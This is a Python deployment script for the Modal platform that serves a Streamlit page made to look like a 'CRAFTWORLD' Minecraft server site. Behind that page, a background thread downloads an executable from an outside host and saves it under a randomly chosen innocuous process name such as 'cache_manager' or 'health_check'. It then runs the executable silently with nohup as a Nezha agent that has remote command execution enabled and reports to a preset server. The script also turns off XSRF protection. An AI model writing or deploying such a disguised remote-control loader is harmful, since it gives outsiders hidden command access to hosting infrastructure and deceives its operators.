import os
import time
import subprocess
import platform
import random
import threading  # 用于启动 agent 后不阻塞 streamlit

# Modal 相关导入
import modal

# ========== 定义 Modal 镜像，安装所需依赖 ==========
image = modal.Image.debian_slim().pip_install(
    "streamlit",
    "requests",
    # 如果有其他依赖，可以继续添加
)

app = modal.App("nezha-streamlit-app", image=image)

# ========== 原有函数保持不变（但将导入移到函数内部以避免顶层加载）==========
def create_directory(file_path):
    if not os.path.exists(file_path):
        os.makedirs(file_path)

def get_system_architecture():
    architecture = platform.machine().lower()
    return 'arm' if ('arm' in architecture or 'aarch64' in architecture) else 'amd'

def download_file(file_name, file_url, file_path):
    import requests  # 函数内部导入
    try:
        response = requests.get(file_url, stream=True, timeout=30)
        response.raise_for_status()
        full_path = os.path.join(file_path, file_name)
        with open(full_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        return True
    except:
        return False

def authorize_files(file_path):
    if os.path.exists(file_path):
        try:
            os.chmod(file_path, 0o775)
        except:
            pass

def exec_cmd(command):
    try:
        subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except:
        pass

def run_agent(file_path, nezha_server, nezha_port, nezha_key, uuid):
    """运行 Nezha Agent 的逻辑，参数从环境变量传入"""
    if not nezha_server or not nezha_key:
        return

    architecture = get_system_architecture()
    disguise_names = ['cache_manager', 'session_handler', 'task_worker', 'log_rotator', 'health_check']
    disguise_name = random.choice(disguise_names)

    # 构造下载 URL
    if nezha_port:
        # 旧版 agent
        url = "https://arm64.ssss.nyc.mn/agent" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/agent"
    else:
        # 新版 v1
        url = "https://arm64.ssss.nyc.mn/v1" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/v1"

    if not download_file(disguise_name, url, file_path):
        return

    agent_path = os.path.join(file_path, disguise_name)
    authorize_files(agent_path)

    # 根据端口判断是否启用 TLS
    tls_ports = ['443', '8443', '2096', '2087', '2083', '2053']

    if nezha_port:
        # 旧版命令行模式
        nezha_tls_flag = '--tls' if nezha_port in tls_ports else ''
        command = f"nohup {agent_path} -s {nezha_server}:{nezha_port} -p {nezha_key} {nezha_tls_flag} >/dev/null 2>&1 &"
    else:
        # 新版配置文件模式（从 server 中提取端口）
        port = nezha_server.split(":")[-1] if ":" in nezha_server else ""
        nezha_tls = "true" if port in tls_ports else "false"
        config_yaml = f"""client_secret: {nezha_key}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 4
server: {nezha_server}
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: {nezha_tls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: {uuid}"""
        config_path = os.path.join(file_path, 'config.yaml')
        with open(config_path, 'w') as f:
            f.write(config_yaml)

        command = f"nohup {agent_path} -c \"{config_path}\" >/dev/null 2>&1 &"

    exec_cmd(command)

# ========== Modal Web 服务入口 ==========
@app.web_server(port=8501, startup_timeout=120)
def web_entry():
    """
    此函数会在 Modal 容器中启动一个 Web 服务器。
    它首先启动 Nezha Agent 后台进程，然后启动 Streamlit 服务器。
    """
    # 从环境变量读取配置（这些变量会在 GitHub Actions 中设置）
    FILE_PATH = os.environ.get('FILE_PATH', '.cache')
    NEZHA_SERVER = os.environ.get('NEZHA_SERVER', 'nezha.loc.cc:443')
    NEZHA_PORT = os.environ.get('NEZHA_PORT', '')
    NEZHA_KEY = os.environ.get('NEZHA_KEY', '')
    UUID = os.environ.get('UUID', 'deef2009-c4e2-4f01-a7d9-0d40b468d258')

    # 创建缓存目录
    create_directory(FILE_PATH)

    # 在新线程中启动 Agent（避免阻塞 Streamlit 启动）
    def agent_thread():
        run_agent(FILE_PATH, NEZHA_SERVER, NEZHA_PORT, NEZHA_KEY, UUID)

    threading.Thread(target=agent_thread, daemon=True).start()

    # 启动 Streamlit 服务器
    # 注意：必须使用 subprocess 启动，因为 streamlit 本身是一个进程
    cmd = [
        "streamlit", "run", __file__,
        "--server.port", "8501",
        "--server.headless", "true",
        "--server.enableCORS", "false",
        "--server.enableXsrfProtection", "false"
    ]
    # 替换当前进程为 streamlit 进程（这样 Modal 就可以管理它的生命周期）
    os.execvp("streamlit", cmd)

# ========== 以下是原有的 Streamlit 页面代码，但稍作调整 ==========
# 注意：当通过 `modal run` 直接执行此文件时，会进入这里；
# 当通过 Web 服务器方式启动时，streamlit 会重新执行此文件作为页面逻辑。
# 因此需要将页面代码放在一个条件中，避免在后台启动时重复执行。

if __name__ == "__main__":
    # 这部分只会在 Streamlit 重新加载文件时执行（即作为页面逻辑）
    import streamlit as st
    import streamlit.components.v1 as components

    # 设置页面配置（必须放在最前）
    st.set_page_config(
        page_title="Minecraft Server",
        page_icon="⛏️",
        layout="wide"
    )

    # 隐藏 Streamlit 默认元素
    st.markdown("""
    <style>
        #MainMenu {visibility: hidden;}
        footer {visibility: hidden;}
        header {visibility: hidden;}
        .stApp {
            margin: 0;
            padding: 0;
        }
    </style>
    """, unsafe_allow_html=True)

    # 你的 HTML 内容（请替换为实际内容）
    html_content = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Minecraft Server</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a472a 0%, #2d5016 50%, #1a472a 100%);
            min-height: 100vh;
            color: #fff;
        }

        .container {
            max-width: 900px;
            margin: 0 auto;
            padding: 40px 20px;
        }

        header {
            text-align: center;
            margin-bottom: 40px;
        }

        .logo {
            font-size: 48px;
            font-weight: bold;
            text-shadow: 4px 4px 0 #000, 2px 2px 0 #333;
            letter-spacing: 2px;
            margin-bottom: 10px;
        }

        .logo span {
            color: #5c913b;
        }

        .subtitle {
            font-size: 18px;
            opacity: 0.9;
        }

        .server-card {
            background: rgba(0, 0, 0, 0.5);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            border: 3px solid #5c913b;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        .server-status {
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 20px;
            margin-bottom: 25px;
        }

        .status-indicator {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .status-dot {
            width: 15px;
            height: 15px;
            border-radius: 50%;
            background: #4ade80;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .status-text {
            font-size: 18px;
            font-weight: bold;
            color: #4ade80;
        }

        .players-online {
            background: rgba(92, 145, 59, 0.3);
            padding: 10px 20px;
            border-radius: 8px;
            font-size: 16px;
        }

        .server-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
        }

        .info-item {
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 8px;
            text-align: center;
        }

        .info-label {
            font-size: 14px;
            opacity: 0.7;
            margin-bottom: 8px;
            text-transform: uppercase;
        }

        .info-value {
            font-size: 20px;
            font-weight: bold;
            color: #5c913b;
        }

        .copy-btn {
            background: #5c913b;
            border: none;
            color: #fff;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            margin-left: 10px;
            transition: background 0.3s;
        }

        .copy-btn:hover {
            background: #4a7a2f;
        }

        .copy-btn:active {
            transform: scale(0.95);
        }

        .how-to-join {
            background: rgba(0, 0, 0, 0.5);
            border-radius: 12px;
            padding: 30px;
            border: 3px solid #444;
        }

        .how-to-join h2 {
            margin-bottom: 20px;
            color: #5c913b;
        }

        .steps {
            list-style: none;
        }

        .steps li {
            padding: 15px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .steps li:last-child {
            border-bottom: none;
        }

        .step-number {
            background: #5c913b;
            width: 35px;
            height: 35px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            flex-shrink: 0;
        }

        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-top: 30px;
        }

        .feature {
            background: rgba(92, 145, 59, 0.2);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            border: 2px solid transparent;
            transition: border-color 0.3s;
        }

        .feature:hover {
            border-color: #5c913b;
        }

        .feature-icon {
            font-size: 32px;
            margin-bottom: 10px;
        }

        .feature-name {
            font-size: 14px;
            font-weight: bold;
        }

        footer {
            text-align: center;
            margin-top: 40px;
            padding: 20px;
            opacity: 0.7;
        }

        .discord-btn {
            display: inline-block;
            background: #5865F2;
            color: #fff;
            padding: 12px 30px;
            border-radius: 8px;
            text-decoration: none;
            font-weight: bold;
            margin-top: 20px;
            transition: background 0.3s;
        }

        .discord-btn:hover {
            background: #4752c4;
        }

        @media (max-width: 600px) {
            .logo {
                font-size: 32px;
            }
            
            .server-status {
                flex-direction: column;
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">CRAFT<span>WORLD</span></div>
            <p class="subtitle">Survival Multiplayer Server</p>
        </header>

        <div class="server-card">
            <div class="server-status">
                <div class="status-indicator">
                    <div class="status-dot"></div>
                    <span class="status-text">SERVER ONLINE</span>
                </div>
                <div class="players-online">👥 5 / 50 Players</div>
            </div>

            <div class="server-info">
                <div class="info-item">
                    <div class="info-label">Server Address</div>
                    <div class="info-value">
                        sk1.liquidnodes.online
                        <button class="copy-btn" onclick="copyIP()">Copy</button>
                    </div>
                </div>
                <div class="info-item">
                    <div class="info-label">Port</div>
                    <div class="info-value">25663</div>
                </div>
                <div class="info-item">
                    <div class="info-label">Version</div>
                    <div class="info-value">1.20.4</div>
                </div>
                <div class="info-item">
                    <div class="info-label">Game Mode</div>
                    <div class="info-value">Survival</div>
                </div>
            </div>
        </div>

        <div class="how-to-join">
            <h2>📖 How to Join</h2>
            <ol class="steps">
                <li>
                    <span class="step-number">1</span>
                    <span>Launch Minecraft Java Edition (Version 1.20.4)</span>
                </li>
                <li>
                    <span class="step-number">2</span>
                    <span>Click "Multiplayer" from the main menu</span>
                </li>
                <li>
                    <span class="step-number">3</span>
                    <span>Click "Add Server" button</span>
                </li>
                <li>
                    <span class="step-number">4</span>
                    <span>Enter server address: <strong>sk1.liquidnodes.online</strong></span>
                </li>
                <li>
                    <span class="step-number">5</span>
                    <span>Click "Done" and join the server!</span>
                </li>
            </ol>
        </div>

        <div class="features">
            <div class="feature">
                <div class="feature-icon">⚔️</div>
                <div class="feature-name">PvP Arena</div>
            </div>
            <div class="feature">
                <div class="feature-icon">🏠</div>
                <div class="feature-name">Land Claim</div>
            </div>
            <div class="feature">
                <div class="feature-icon">💰</div>
                <div class="feature-name">Economy</div>
            </div>
            <div class="feature">
                <div class="feature-icon">🎁</div>
                <div class="feature-name">Daily Rewards</div>
            </div>
            <div class="feature">
                <div class="feature-icon">👑</div>
                <div class="feature-name">Ranks</div>
            </div>
            <div class="feature">
                <div class="feature-icon">🌍</div>
                <div class="feature-name">World Border</div>
            </div>
        </div>

        <div style="text-align: center;">
            <a href="#" class="discord-btn">💬 Join our Discord</a>
        </div>

        <footer>
            <p>© 2024 uptime Server. All rights reserved.</p>
            <p>Not affiliated with Mojang Studios.</p>
        </footer>
    </div>

    <script>
        function copyIP() {
            navigator.clipboard.writeText('sk1.liquidnodes.online').then(() => {
                const btn = document.querySelector('.copy-btn');
                btn.textContent = 'Copied!';
                setTimeout(() => {
                    btn.textContent = 'Copy';
                }, 2000);
            });
        }
    </script>
</body>
</html>
    """

    # 渲染 HTML
    components.html(html_content, height=1200, scrolling=True)
